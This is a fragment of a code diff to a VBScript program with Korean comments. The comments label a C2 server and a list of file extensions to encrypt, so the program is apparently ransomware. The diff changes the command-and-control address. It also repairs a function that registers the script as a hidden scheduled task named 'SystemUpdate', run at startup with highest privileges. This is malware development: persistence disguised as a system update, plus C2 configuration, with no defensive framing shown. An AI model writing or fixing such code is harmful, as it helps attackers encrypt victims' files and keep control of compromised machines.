@@ -7,7 +7,7 @@ Dim TARGET_EXTENSIONS
 Dim C2_SERVER
 
 ' C2 서버 설정
-C2_SERVER = "http://192.168.1.100:8080"
+C2_SERVER = "http://192.168.202.44:8081"
 
 ' 암호화 대상 확장자
 TARGET_EXTENSIONS = Array( _
@@ -226,13 +226,11 @@ End Sub
 
 Sub CreateStartupTask(targetPath)
     On Error Resume Next
-    
+
     Dim taskCmd
-    
-    taskCmd = "schtasks /create /tn ""SystemUpdate"" " & _
-              "/tr ""wscript.exe \"""""" & targetPath & "\""""" """ " & _
-              "/sc onstart /rl highest /f"
-    
+
+    taskCmd = "schtasks /create /tn ""SystemUpdate"" /tr ""wscript.exe " & Chr(34) & targetPath & Chr(34) & """ /sc onstart /rl highest /f"
+
     objShell.Run taskCmd, 0, True
 End Sub
 
